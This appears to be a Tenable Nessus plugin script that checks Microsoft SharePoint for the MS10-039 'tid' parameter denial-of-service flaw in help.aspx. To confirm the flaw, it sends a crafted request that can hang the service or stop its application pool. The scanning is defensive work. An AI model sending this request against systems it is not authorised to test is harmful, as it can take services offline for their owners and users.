#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(47579);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2014/08/09 23:56:13 $");

  script_cve_id("CVE-2010-1264");
  script_bugtraq_id(40559);
  script_osvdb_id(65220);
  script_xref(name:"IAVA", value:"2010-A-0079");
  script_xref(name:"MSFT", value:"MS10-039");
  script_xref(name:"Secunia", value:"39603");

  script_name(english:"Microsoft SharePoint Service Help.aspx 'tid' Parameter DoS");
  script_summary(english:"Attempts a temporary DoS attack");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote web server has a denial of
service vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Microsoft SharePoint Services running on the remote
host has a denial of service vulnerability. Sending invalid data to
the 'tid' parameter of 'help.aspx' can cause the application to hang.

A remote attacker could exploit this by sending malicious requests,
causing SharePoint to hang temporarily, resulting in a denial of
service. Repeatedly sending malicious requests can cause SharePoint's
application pool to stop, which would require a manual restart of the
application pool.");
  script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/MS10-039");
  script_set_attribute(attribute:"solution", value:"Microsoft has released a set of patches for SharePoint Services.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/06/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/06/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"stig_severity", value:"II");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2014 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "sharepoint_detect.nasl");
  script_require_keys("www/ASP", "www/sharepoint", "Settings/ParanoidReport");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("smb_func.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

if ( get_kb_item("SMB/dont_send_in_cleartext" ) ) exit(0);

if (report_paranoia < 2)
  exit(1, "This plugin only runs if 'Report paranoia' is set to 'Paranoid'.");

port = get_http_port(default:80, asp:TRUE);
install = get_install_from_kb(appname:'sharepoint', port:port, exit_on_fail:TRUE);

function get_http_code()
{
  local_var res, headers, http_code;
  res = _FCT_ANON_ARGS[0];
  if (isnull(res)) return NULL;

  headers = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(headers)) exit(1, 'Error parsing HTTP headers on port '+port+'.');

  http_code = headers['$code'];
  if (isnull(http_code)) exit(1, "Error parsing HTTP response code");

  return http_code;
}


url = install['dir']+'/_layouts/help.aspx';
dos_qs = '?tid=1&'+SCRIPT_NAME+'='+unixtime();
vuln = FALSE;

# First, make sure the page is accessible
res = http_send_recv3(
  method:'GET',
  item:url,
  port:port,
  username:kb_smb_login(),
  password:kb_smb_password(),
  exit_on_fail:TRUE
);

code = get_http_code(res);
if (code == 401) exit(1, 'Authentication failed on port '+port+'.');
if ('<title>Help</title>' >!< res[2] || '<br/>Cannot display help.<br/>' >!< res[2])
  exit(1, 'Error retrieving '+build_url(qs:url,port:port));

# Next, attempt to trigger the DoS
res = http_send_recv3(
  method:'GET',
  item:url+dos_qs,
  port:port,
  username:kb_smb_login(),
  password:kb_smb_password()
);

# Check if there is a timeout.  Otherwise, check for a HTTP 503
# (which likely means the application pool has stopped)
if (isnull(res)) vuln = TRUE;
else
{
  code = get_http_code(res);
  if (code == 503 && res[2] == '<h1>Service Unavailable</h1>')
    vuln = TRUE;
}

if (vuln)
{
  if (report_verbosity > 0)
  {
    report = get_vuln_report(items:url+dos_qs, port:port);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else exit(0, 'SharePoint Services on port '+port+' is not affected.');
